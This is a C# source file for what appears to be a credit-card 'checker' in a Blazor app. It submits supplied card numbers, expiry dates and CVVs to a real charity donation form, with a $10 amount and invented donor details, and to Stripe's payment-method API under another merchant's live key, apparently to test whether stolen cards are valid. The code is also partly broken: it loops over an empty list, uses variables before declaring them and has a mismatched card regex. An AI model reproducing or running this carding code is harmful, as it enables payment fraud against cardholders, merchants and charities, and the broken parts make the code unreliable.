using System.Net;
using System.Text;
using System.Text.RegularExpressions;

namespace BlazorApp.gfc
{
    public class CccheckerWK{


        public void work()
        {

        }

        public async Task Start(string ccIn){
            
         //split txt by lines 
         string[] textLines = ccIn.Split(new[]{ Environment.NewLine }, StringSplitOptions.None);
         //add lines to a list 
         List<String> ccList = new List<string>();
        foreach(var line in ccList){
            //check if string is a card
            if(!isCcFormat(line)){return;}

              

        }


            



        }

        private bool isCcFormat(string line)
        {
            throw new NotImplementedException();
        }

        public async Task<string> _func03(string cc, string mes, string ano, string cvv, string country, string state, string city, string zipcode)
        {

            //string URL = "https://secure2.convio.net/unfpa/site/Donation2";
            //CookieContainer MyCookies = new CookieContainer();
            //ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12 | SecurityProtocolType.Ssl3;
            //HttpWebRequest request = WebRequest.CreateHttp(URL);
            //request.CookieContainer = MyCookies;
            //request.Method = "POST";

            //byte[] data = Encoding.UTF8.GetBytes("user_donation_amt=%2410.00&company_min_matching_amt=&currency_locale=en_US&level_flexibleexpandedsubmit=true&level_flexibleexpandedsubmit=true&level_flexibleexpandedsubmit=true&level_flexibleexpandedsubmit=true&level_flexibleexpandedsubmit=true&level_flexibleexpanded=2027&level_flexibleexpanded2027amount=%2410.00&level_flexibleexpandedsubmit=true&level_flexiblesubmit=true&level_flexiblegift_type=1&level_flexiblegift_typesubmit=true&level_flexibledurationsubmit_skip=true&matching_giftsubmit=true&donor_employername=&donor_employersubmit=true&billing_first_namename=Peter&billing_first_namesubmit=true&billing_last_namename=Saterin&billing_last_namesubmit=true&billing_addr_street1name=Street+1234&billing_addr_street1submit=true&billing_addr_street2name=&billing_addr_street2submit=true&billing_addr_cityname=" + city + "&billing_addr_citysubmit=true&billing_addr_state=" + state + "&billing_addr_statesubmit=true&billing_addr_zipname=" + zipcode + "&billing_addr_zipsubmit=true&billing_addr_country=" + country + "&billing_addr_countrysubmit=true&donor_email_addressname=covobaha%40g-mailix.com&donor_email_addresssubmit=true&donor_email_opt_insubmit=true&responsive_payment_typepay_typeradio=credit&responsive_payment_typepay_typeradiosubmit=true&responsive_payment_typecc_typesubmit=true&responsive_payment_typecc_numbername=" + number1 + "+" + number2 + "+" + number3 + "+" + number4 + "&responsive_payment_typecc_numbersubmit=true&responsive_payment_typecc_exp_date_MONTH=" + mes + "&responsive_payment_typecc_exp_date_YEAR=" + ano + "&responsive_payment_typecc_exp_date_DAY=1&responsive_payment_typecc_exp_datesubmit=true&responsive_payment_typecc_cvvname=" + cvv + "&responsive_payment_typecc_cvvsubmit=true&responsive_payment_typesubmit=true&tribute_show_honor_fieldssubmit=true&tribute_type=&tribute_typesubmit_skip=true&tribute_honoree_namename=&tribute_honoree_namesubmit_skip=true&send_ecardsubmit=true&stationery_layout_chooser=true&stationery_layout_id=1201&select_gridsubmit=true&ecard_recpientsname=&ecard_recpientssubmit=true&tribute_ecard_subjectname=&tribute_ecard_subjectsubmit=true&tribute_ecard_messagename=&tribute_ecard_messagesubmit=true&nullsubmit=true&preview_buttonsubmit=true&e_card_copy_sendersubmit=true&pstep_finish=Process&idb=204713667&df_id=1523&mfc_pref=T&1523.donation=form1");
            //request.ContentType = "application/x-www-form-urlencoded";
            //request.ContentLength = data.Length;
            //Stream dataStream = request.GetRequestStream();
            //dataStream.Write(data, 0, data.Length);
            //dataStream.Close();          
            //request.UserAgent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36";
            //WebResponse response = request.GetResponse();
            ///Stream Stream = response.GetResponseStream();
            //StreamReader reader = new StreamReader(Stream);
            //string pagina = reader.ReadToEnd();


            //string rs =  OpaGet(Pagina, "name=\"_token\"", "value=\"","\"");

            //HttpClientHandler HttpCLientHandler = new HttpClientHandler();
            //HttpCLientHandler.CookieContainer = MyCookies;
            //HttpClient HC = new HttpClient(HttpCLientHandler);
            HttpClient HC = new HttpClient();

          //  ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12 | SecurityProtocolType.Ssl3;
            string number1 = cc.Substring(0, 4);
            string number2 = cc.Substring(4, 4);
            string number3 = cc.Substring(8, 4);
            string number4 = cc.Substring(12, 4);
            string Post = "user_donation_amt=%2410.00&company_min_matching_amt=&currency_locale=en_US&level_flexibleexpandedsubmit=true&level_flexibleexpandedsubmit=true&level_flexibleexpandedsubmit=true&level_flexibleexpandedsubmit=true&level_flexibleexpandedsubmit=true&level_flexibleexpanded=2027&level_flexibleexpanded2027amount=%2410.00&level_flexibleexpandedsubmit=true&level_flexiblesubmit=true&level_flexiblegift_type=1&level_flexiblegift_typesubmit=true&level_flexibledurationsubmit_skip=true&matching_giftsubmit=true&donor_employername=&donor_employersubmit=true&billing_first_namename=Peter&billing_first_namesubmit=true&billing_last_namename=Saterin&billing_last_namesubmit=true&billing_addr_street1name=Street+1234&billing_addr_street1submit=true&billing_addr_street2name=&billing_addr_street2submit=true&billing_addr_cityname=" + city + "&billing_addr_citysubmit=true&billing_addr_state=" + state + "&billing_addr_statesubmit=true&billing_addr_zipname=" + zipcode + "&billing_addr_zipsubmit=true&billing_addr_country=" + country + "&billing_addr_countrysubmit=true&donor_email_addressname=covobaha%40g-mailix.com&donor_email_addresssubmit=true&donor_email_opt_insubmit=true&responsive_payment_typepay_typeradio=credit&responsive_payment_typepay_typeradiosubmit=true&responsive_payment_typecc_typesubmit=true&responsive_payment_typecc_numbername=" + number1 + "+" + number2 + "+" + number3 + "+" + number4 + "&responsive_payment_typecc_numbersubmit=true&responsive_payment_typecc_exp_date_MONTH=" + mes + "&responsive_payment_typecc_exp_date_YEAR=" + ano + "&responsive_payment_typecc_exp_date_DAY=1&responsive_payment_typecc_exp_datesubmit=true&responsive_payment_typecc_cvvname=" + cvv + "&responsive_payment_typecc_cvvsubmit=true&responsive_payment_typesubmit=true&tribute_show_honor_fieldssubmit=true&tribute_type=&tribute_typesubmit_skip=true&tribute_honoree_namename=&tribute_honoree_namesubmit_skip=true&send_ecardsubmit=true&stationery_layout_chooser=true&stationery_layout_id=1201&select_gridsubmit=true&ecard_recpientsname=&ecard_recpientssubmit=true&tribute_ecard_subjectname=&tribute_ecard_subjectsubmit=true&tribute_ecard_messagename=&tribute_ecard_messagesubmit=true&nullsubmit=true&preview_buttonsubmit=true&e_card_copy_sendersubmit=true&pstep_finish=Process&idb=204713667&df_id=1523&mfc_pref=T&1523.donation=form1";
            HC.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36");
            StringContent StringContent = new StringContent(Post, Encoding.UTF8, "application/x-www-form-urlencoded");
            HttpResponseMessage result = await HC.PostAsync(new Uri("https://secure2.convio.net/unfpa/site/Donation2"), StringContent);
            string final = await result.Content.ReadAsStringAsync();
            return final;

        }

        public async Task<string> _func01(HttpClient HC)
        {
            //  HttpClient HC = new HttpClient();

          //  ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12 | SecurityProtocolType.Ssl3;
            string Post = "JTdCJTIydjIlMjIlM0EyJTJDJTIyaWQlMjIlM0ElMjI4MDAyZjA0OTIyMTFlNDkyMjQ1ZTJkOWJiOGMyYTJmZSUyMiUyQyUyMnQlMjIlM0E4JTJDJTIydGFnJTIyJTNBJTIyNC41LjM1JTIyJTJDJTIyc3JjJTIyJTNBJTIyanMlMjIlMkMlMjJhJTIyJTNBJTdCJTIyYSUyMiUzQSU3QiUyMnYlMjIlM0ElMjJ0cnVlJTIyJTJDJTIydCUyMiUzQTAlN0QlMkMlMjJiJTIyJTNBJTdCJTIydiUyMiUzQSUyMmZhbHNlJTIyJTJDJTIydCUyMiUzQTAlN0QlMkMlMjJjJTIyJTNBJTdCJTIydiUyMiUzQSUyMnB0LUJSJTJDcHQlMkNlbi1VUyUyQ2VuJTIyJTJDJTIydCUyMiUzQTAlN0QlMkMlMjJkJTIyJTNBJTdCJTIydiUyMiUzQSUyMldpbjMyJTIyJTJDJTIydCUyMiUzQTAlN0QlMkMlMjJlJTIyJTNBJTdCJTIydiUyMiUzQSUyMiUyMiUyQyUyMnQlMjIlM0EwJTdEJTJDJTIyZiUyMiUzQSU3QiUyMnYlMjIlM0ElMjIxMzY2d183MjhoXzI0ZF8xciUyMiUyQyUyMnQlMjIlM0EwJTdEJTJDJTIyZyUyMiUzQSU3QiUyMnYlMjIlM0ElMjIxJTIyJTJDJTIydCUyMiUzQTAlN0QlMkMlMjJoJTIyJTNBJTdCJTIydiUyMiUzQSUyMmZhbHNlJTIyJTJDJTIydCUyMiUzQTAlN0QlMkMlMjJpJTIyJTNBJTdCJTIydiUyMiUzQSUyMnNlc3Npb25TdG9yYWdlLWVuYWJsZWQlMkMlMjBsb2NhbFN0b3JhZ2UtZW5hYmxlZCUyMiUyQyUyMnQlMjIlM0EwJTdEJTJDJTIyaiUyMiUzQSU3QiUyMnYlMjIlM0ElMjIwMTAwMTEwMTAxMTExMTExMTAxMDAxMTAxMTExMTExMTAxMTEwMDEwMTEwMTExMTEwMTExMTEwJTIyJTJDJTIydCUyMiUzQTglN0QlMkMlMjJrJTIyJTNBJTdCJTIydiUyMiUzQSUyMiUyMiUyQyUyMnQlMjIlM0EwJTdEJTJDJTIybCUyMiUzQSU3QiUyMnYlMjIlM0ElMjJNb3ppbGxhJTJGNS4wJTIwKFdpbmRvd3MlMjBOVCUyMDEwLjAlM0IlMjBXaW42NCUzQiUyMHg2NCUzQiUyMHJ2JTNBODkuMCklMjBHZWNrbyUyRjIwMTAwMTAxJTIwRmlyZWZveCUyRjg5LjAlMjIlMkMlMjJ0JTIyJTNBMCU3RCUyQyUyMm0lMjIlM0ElN0IlMjJ2JTIyJTNBJTIyJTIyJTJDJTIydCUyMiUzQTAlN0QlMkMlMjJuJTIyJTNBJTdCJTIydiUyMiUzQSUyMmZhbHNlJTIyJTJDJTIydCUyMiUzQTglN0QlMkMlMjJvJTIyJTNBJTdCJTIydiUyMiUzQSUyMmUxM2Q3NzVjNGIxNmRhN2ZiYjhmMzVkNmJhMWIyMWVmJTIyJTJDJTIydCUyMiUzQTclN0QlN0QlMkMlMjJiJTIyJTNBJTdCJTIyYSUyMiUzQSUyMiUyMiUyQyUyMmIlMjIlM0ElMjJodHRwcyUzQSUyRiUyRmNoZWNrb3V0LnN0cmlwZS5jb20lMkZVYTV1QWFqcjVERXE3dXBEMDFXR1ptNjNEbkNVUDdhdW41S016NFZDWmswJTJGUUZOSFUzWm8tQnozdHJkWmhRRTBUMXdvZVByLThET0EwXzJlT2Q1bDFqdyUyM3pRbmdGdGZwcXhwdXc5UkQwOXEtQTM4dUpvNGZfcHZhS3hNX1BacVdHcjAlMjIlMkMlMjJjJTIyJTNBJTIyU2h0MWc3YTBRYWxnWVJyajM1Z05rZmtXcWhfOERRSENWVW9zMDNxOUt0SSUyMiUyQyUyMmQlMjIlM0ElMjJmY2M4ZDMyNy0wMmQ1LTQ3YWUtODI0NS1hMDE4NTVjODFlNjIzYjlhYWIlMjIlMkMlMjJlJTIyJTNBJTIyM2FhMTVjYzgtMGQ0ZC00ZDMwLTg4MDQtZTY2NWYxZTcyYmIwMGJjOTM5JTIyJTJDJTIyZiUyMiUzQWZhbHNlJTJDJTIyZyUyMiUzQXRydWUlMkMlMjJoJTIyJTNBdHJ1ZSUyQyUyMmklMjIlM0ElNUIlMjJsb2NhdGlvbiUyMiU1RCUyQyUyMmolMjIlM0ElNUIlNUQlMkMlMjJuJTIyJTNBNjAlMkMlMjJ1JTIyJTNBJTIyY2hlY2tvdXQuc3RyaXBlLmNvbSUyMiU3RCUyQyUyMmglMjIlM0ElMjJkMTU1NmFlMTI3MTJkZDYxYmYzMCUyMiU3RA==";
            HC.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0");
            StringContent StringContent = new StringContent(Post, Encoding.UTF8, "text/plain");
            HttpResponseMessage result = await HC.PostAsync(new Uri("https://m.stripe.com/6"), StringContent);
            string final = await result.Content.ReadAsStringAsync();
            return final;
        }

        public async Task<string> _func02(HttpClient HC, string cc, string mes, string ano, string cvv, string muid, string guid, string sid)
        {

           // string con = await consulta(cc.Substring(0, 6));
           // Console.WriteLine(con);


            //   HttpClient HC = new HttpClient();

            //ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12 | SecurityProtocolType.Ssl3;
            string Post = $"type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&billing_details[name]=cona+larga&billing_details[email]=algumnacoissa%40gmail.com&billing_details[address][country]=PT&billing_details[address][line1]=lleos&billing_details[address][line2]=aki&billing_details[address][city]=cartaxo&billing_details[address][postal_code]=2070-26&guid={guid}&muid={muid}&sid={sid}&_stripe_account=acct_1CFMpBAasaqnO7tk&key=pk_live_a59hsiMEjnyHSbrVAHKexoYm&payment_user_agent=stripe.js%2Fa1e9df259%3B+stripe-js-v3%2Fa1e9df259%3B+checkout";
            HC.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0");
            StringContent StringContent = new StringContent(Post, Encoding.UTF8, "application/x-www-form-urlencoded");
            HttpResponseMessage result = await HC.PostAsync(new Uri("https://api.stripe.com/v1/payment_methods"), StringContent);
            string final = await result.Content.ReadAsStringAsync();
            //Console.WriteLine($"type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&billing_details[name]=cona+larga&billing_details[email]=algumnacoissa%40gmail.com&billing_details[address][country]=PT&billing_details[address][line1]=lleos&billing_details[address][line2]=aki&billing_details[address][city]=cartaxo&billing_details[address][postal_code]=2070-26&guid={guid}&muid={muid}&sid={sid}&_stripe_account=acct_1CFMpBAasaqnO7tk&key=pk_live_a59hsiMEjnyHSbrVAHKexoYm&payment_user_agent=stripe.js%2Fa1e9df259%3B+stripe-js-v3%2Fa1e9df259%3B+checkout");
            return final;
        }

        private bool IsCcFormat(string str)
        {
            Regex card = new Regex(@"^[1-9][0-9]{2}-[1-3]{3}-[0-9]{3}-[0-9]{3}$");
            string myCard = str;
            Match m = card.Match(myCard);

            if (m.Success)
            {
                return true;
            }
            return false;
        }

    }

}